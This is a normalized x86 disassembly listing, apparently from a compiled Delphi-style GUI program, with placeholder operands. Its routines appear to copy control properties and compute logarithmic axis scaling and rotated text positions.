mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x80 ]
mov eax [ ebx + 0x80 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x34 ]
mov [ ebx + 0x34 ] eax
mov edx [ edi + 0x3c ]
mov eax [ ebx + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x78 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x6c ]
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x88 ]
mov [ ebx + 0x88 ] eax
mov eax [ edi + 0x74 ]
mov [ ebx + 0x74 ] eax
mov eax [ edi + 0x70 ]
mov [ ebx + 0x70 ] eax
mov eax [ edi + 0x84 ]
mov [ ebx + 0x84 ] eax
lea eax [ ebx + 0x60 ]
mov edx [ edi + 0x60 ]
call sub_403f3c
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov al [ edi + 0x4 ]
mov [ ebx + 0x4 ] al
mov al [ edi + 0x5 ]
mov [ ebx + 0x5 ] al
mov al [ edi + 0x6 ]
mov [ ebx + 0x6 ] al
mov edx [ edi + 0x30 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x64 ]
mov edx [ edi + 0x64 ]
call sub_403f3c
mov al [ edi + 0x40 ]
mov [ ebx + 0x40 ] al
mov al [ edi + 0x20 ]
mov [ ebx + 0x20 ] al
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov al [ edi + 0x8d ]
mov [ ebx + 0x8d ] al
mov al [ edi + 0x68 ]
mov [ ebx + 0x68 ] al
mov al [ edi + 0x69 ]
mov [ ebx + 0x69 ] al
mov al [ edi + 0x8c ]
mov [ ebx + 0x8c ] al
mov al [ edi + 0xe0 ]
mov [ ebx + 0xe0 ] al
mov eax [ edi + 0x98 ]
mov [ ebx + 0x98 ] eax
mov eax [ edi + 0x9c ]
mov [ ebx + 0x9c ] eax
mov eax [ edi + 0xa0 ]
mov [ ebx + 0xa0 ] eax
mov eax [ edi + 0xa4 ]
mov [ ebx + 0xa4 ] eax
mov eax [ edi + 0xa8 ]
mov [ ebx + 0xa8 ] eax
mov eax [ edi + 0xac ]
mov [ ebx + 0xac ] eax
mov al [ edi + 0x94 ]
mov [ ebx + 0x94 ] al
mov al [ edi + 0x8e ]
mov [ ebx + 0x8e ] al
mov al [ edi + 0x8f ]
mov [ ebx + 0x8f ] al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_465a80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465b54
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc8 ] 0x0
je r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx esi
mov eax [ ebx + 0x60 ]
call sub_409820
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push 0xffffffff
push esi
mov edi eax
xor ecx ecx
mov edx ebx
mov eax [ edi + 0x30c ]
call [ edi + 0x308 ]
mov eax esi
call sub_403ee8
jmp r-xdata
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465b5b
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax esi
mov edx r-xdata
call sub_462314
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x30a ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x64 ]
call sub_403f80
push [ ebx + 0xc4 ]
push [ ebx + 0xc0 ]
lea eax [ ebp - 0x4 ]
call sub_460c14
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40a898
jmp r-xdata
sub_465b74
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov ebx eax
mov al [ ebx + 0x58 ]
test al al
jne r-xdata
mov [ esp ] al
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov [ esp ] 0x1
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp ] 0x4
mov esi [ ebx + 0x90 ]
mov eax [ esi + 0x2e8 ]
call sub_46cf30
test eax eax
jle r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov eax [ esi + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc ebp
dec edi
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x90 ]
call sub_46da00
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
jmp r-xdata
mov [ esp ] 0x2
cmp [ ebx + 0x8e ] 0x0
je r-xdata
inc ebp
dec edi
jne r-xdata
cmp [ ebx + 0xfb ] 0x0
jne r-xdata
cmp [ ebx + 0x8e ] 0x0
jne r-xdata
mov eax esi
call sub_46a554
test al al
jne r-xdata
mov edx ebp
mov eax esi
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
jmp r-xdata
mov [ esp ] 0x2
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
fstp [ esp + 0x4 ]
fwait
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
fcomp [ esp + 0x4 ]
fnstsw ax
sahf
je r-xdata
mov eax esi
call sub_46a554
test al al
jne r-xdata
mov eax [ esi + 0x88 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ esi + 0x88 ]
call sub_414090
test eax eax
je r-xdata
mov [ esp ] 0x4
jmp r-xdata
sub_465cb8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_465e2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_464db4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0xb8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xbc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0xb0 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0xb4 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_465660
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb8 ]
fdiv [ ebp - 0x8 ]
call sub_402970
fmul [ ebp - 0x8 ]
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb0 ]
fdiv [ ebp - 0x8 ]
call sub_402970
fmul [ ebp - 0x8 ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x90 ]
mov eax [ ebx + 0x308 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x30c ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebx + 0x308 ] eax
mov [ ebx + 0x30c ] eax
mov esi [ ebx + 0x288 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_465a80
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_461614
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_465a80
mov edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_461614
pop edx
call sub_460384
mov edi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
add edi eax
mov esi edi
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x308 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebx + 0x30c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e36
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f0c
retn
sub_465e4c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_465b74
sub al 0x2
je r-xdata
push ebp
call sub_465cb8
pop ecx
pop ecx
pop ebp
retn
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_46d9b0
pop ecx
pop ebp
retn
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_46d8e4
pop ecx
pop ebp
retn
jmp r-xdata
xor eax eax
pop ecx
pop ebp
retn
sub_465ed0
push ebx
push esi
mov ebx edx
mov esi eax
lea edx [ esi + 0x4 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_461550
mov eax [ esi + 0x90 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x6 ] bl
mov [ esi + 0x5 ] bl
sub_465efc
push ebx
push esi
mov ebx edx
mov esi eax
lea edx [ esi + 0x6 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_461550
test bl bl
je r-xdata
mov [ esi + 0x4 ] 0x0
cmp [ esi + 0x5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x4 ] 0x1
pop esi
pop ebx
retn
sub_465f2c
push ebx
push esi
mov ebx edx
mov esi eax
lea edx [ esi + 0x5 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_461550
test bl bl
je r-xdata
mov [ esi + 0x4 ] 0x0
cmp [ esi + 0x6 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x4 ] 0x1
pop esi
pop ebx
retn
sub_465f5c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_465fa5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4042f4
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fac
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_465fdc
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_46603c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x24 ] 0x2
jge r-xdata
lea ecx [ eax + 0x24 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466043
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_466048
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46610c
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_464db4
test al al
je r-xdata
lea edx [ esi + 0x20 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_461550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466113
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
mov eax esi
call sub_465858
fld [ esi + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
fld [ esi + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
sub_466120
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466176
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_460f34
lea edx [ ebx + 0x44 ]
mov ecx esi
mov eax [ ebx + 0x90 ]
call sub_461564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46617d
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_466184
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_4661e2
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jge r-xdata
lea ecx [ eax + 0x50 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4661e9
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_466268
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4662f7
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov eax ebx
call sub_464db4
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebx + 0x90 ]
call sub_461514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662fe
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40a8f4
sub_46630c
push ebp
mov ebp esp
push 0x0
mov edx eax
xor eax eax
push ebp
push sub_46637c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x90 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax edx
call sub_466388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466383
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
fld [ ebp + 0x8 ]
fcomp [ edx + 0x10 ]
fnstsw ax
sahf
jbe r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_4663a4
push ebp
mov ebp esp
push 0x0
mov edx eax
xor eax eax
push ebp
push sub_466414
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x90 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax edx
call sub_4664a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46641b
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
fld [ ebp + 0x8 ]
fcomp [ edx + 0x18 ]
fnstsw ax
sahf
jae r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_466420
push ebp
mov ebp esp
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x6 ] 0x0
mov [ ebx + 0x5 ] 0x0
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_466388
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_4664a0
fld [ ebx + 0x10 ]
fsub [ ebx + 0x18 ]
fld [ r-xdata ]
fcompp
fnstsw ax
sahf
jbe r-xdata
lea edx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
call sub_460394
pop ebx
pop ebp
retn 0x10
fld [ r-xdata ]
fadd [ ebx + 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4664a0
sub_46650c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x90 ]
mov edx [ eax + 0x288 ]
cmp [ eax + 0x270 ] 0x0
je r-xdata
mov esi [ ebx + 0x30 ]
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov eax [ edx + 0x8 ]
cmp [ eax + 0x18 ] 0xffffff
jne r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x14 ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4665a8
mov ebx [ esi + 0x4 ]
mov edi [ ebx + 0x288 ]
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebx + 0x280 ]
sar eax 0x1
jns r-xdata
mov eax [ edx + 0x8 ]
xor edx edx
call sub_41ce24
push eax
mov eax [ esi + 0x14 ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
adc eax 0x0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4665a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_466912
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_45c9c4
sar eax 0x1
jns r-xdata
mov edx ebx
sub edx 0x1
jb r-xdata
adc eax 0x0
xor ecx ecx
mov cl [ esi + 0x8f ]
mov dl [ esi + 0x8e ]
mov edi edx
and edi 0x7f
lea edi [ edi * 8 + rw-data ]
mov edi [ edi + ecx * 4 ]
test dl dl
jne r-xdata
sub edx 0x59
je r-xdata
mov eax [ esi + 0x90 ]
mov edx [ eax + 0x288 ]
mov [ ebp - 0x1c ] edx
cmp [ esi + 0x8f ] 0x0
je r-xdata
sub [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x8e ] 0x0
je r-xdata
sub edx 0x5a
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax + 0x280 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov al [ esi + 0x8f ]
xor al 0x1
and eax 0x7f
mov edi [ eax * 4 + rw-data ]
jmp r-xdata
xor edx edx
mov dl [ esi + 0x8f ]
mov edi [ edx * 4 + rw-data ]
sub [ ebp - 0x4 ] eax
jmp r-xdata
mov cl [ esi + 0x8f ]
xor cl 0x1
and ecx 0x7f
mov dl [ esi + 0x8e ]
mov edi edx
and edi 0x7f
lea edi [ edi * 8 + rw-data ]
mov edi [ edi + ecx * 4 ]
test dl dl
jne r-xdata
sub edx 0x5a
je r-xdata
neg [ ebp - 0xc ]
cmp ebx 0x10e
jne r-xdata
mov edx edi
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebp + 0x8 ]
call sub_462344
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_45c9c4
mov [ ebp - 0xc ] eax
cmp ebx 0xb4
je r-xdata
add [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x8e ] 0x0
je r-xdata
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0xc ]
imul edi
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
call sub_402990
cmp [ esi + 0x8e ] 0x0
je r-xdata
xor eax eax
mov al [ esi + 0x8f ]
mov edi [ eax * 4 + rw-data ]
jmp r-xdata
mov dl [ esi + 0x8f ]
xor dl 0x1
and edx 0x7f
mov edi [ edx * 4 + rw-data ]
add [ ebp - 0x4 ] eax
jmp r-xdata
xor edi edi
fild [ ebp - 0xc ]
fmul [ r-xdata ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fmulp st1
call sub_402990
sub [ ebp - 0x8 ] eax
jmp r-xdata
cmp ebx 0xb4
jne r-xdata
cmp ebx 0xb4
jne r-xdata
cmp [ esi + 0x8f ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f80
test edi edi
jle r-xdata
cmp [ esi + 0x8f ] 0x0
je r-xdata
cmp ebx 0x5a
je r-xdata
cmp [ esi + 0x8f ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x8 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466919
lea eax [ ebp - 0x28 ]
call sub_403ee8
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f0c
retn
mov [ ebp - 0x20 ] edi
cmp ebx 0x5a
jne r-xdata
cmp ebx 0x5a
jne r-xdata
fild [ ebp - 0xc ]
fmul [ r-xdata ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fmulp st1
call sub_402990
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x10e
jne r-xdata
sub [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_403f80
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404408
jmp r-xdata
cmp ebx 0x10e
jne r-xdata
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x10e
jne r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0xb4
jne r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0x124 ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0xc ]
sub [ ebp - 0x4 ] eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x5a
je r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov ecx esi
mov edx 0x1
call sub_404448
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x4 ] eax
cmp ebx 0x10e
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0x118 ]
lea eax [ ebp - 0x28 ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_4040d0
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
call sub_40c6a4
mov esi eax
test esi esi
jle r-xdata
sub_466928
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x5 ] 0x0
fld [ esi + 0x10 ]
fadd [ ebp + 0x8 ]
fstp [ esi + 0x10 ]
fwait
mov [ esi + 0x6 ] 0x0
fld [ esi + 0x18 ]
fadd [ ebp + 0x8 ]
fstp [ esi + 0x18 ]
fwait
mov eax [ esi + 0x90 ]
mov edx [ eax ]
call [ edx + 0x80 ]
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov al [ esi + 0x8e ]
push eax
xor ecx ecx
mov edx esi
mov eax [ esi + 0x90 ]
call sub_46d47c
fcomp [ esi + 0x10 ]
fnstsw ax
sahf
ja r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
mov al [ esi + 0x8e ]
push eax
mov cl 0x1
mov edx esi
mov eax [ esi + 0x90 ]
call sub_46d47c
fcomp [ esi + 0x18 ]
fnstsw ax
sahf
jae r-xdata
sub_4669c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
fld [ ebx + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
fld [ ebx + 0xb8 ]
fldln2
fxch st1
fyl2x
fstp [ edi ]
fwait
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
jmp r-xdata
fld [ ebx + 0xb0 ]
fldln2
fxch st1
fyl2x
fstp [ esi ]
fwait
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
fld [ ebx + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
fld [ esi ]
fsub [ edi ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_466a3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
fld [ ebx + 0xc0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
cmp [ ebx + 0x8d ] 0x0
je r-xdata
mov eax [ esi + 0x280 ]
sar eax 0x1
jns r-xdata
fld [ ebp + 0x8 ]
fsub [ ebx + 0xb8 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0xb0 ]
fsub [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
adc eax 0x0
jmp r-xdata
fild [ esi + 0x280 ]
fmul [ r-xdata ]
fmul [ ebp - 0x8 ]
fdiv [ ebx + 0xc0 ]
call sub_402990
sub_466abc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov ebx edx
mov esi eax
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4669c8
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ esi + 0xcc ]
jmp r-xdata
cmp [ esi + 0x8d ] 0x0
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp + 0x8 ]
fldln2
fxch st1
fyl2x
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp + 0x8 ]
fldln2
fxch st1
fyl2x
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x8d ] 0x0
jne r-xdata
mov edx [ esi + 0xd8 ]
sub edx eax
mov eax edx
add eax [ esi + 0xd4 ]
jmp r-xdata
fild [ esi + 0xdc ]
fmul [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
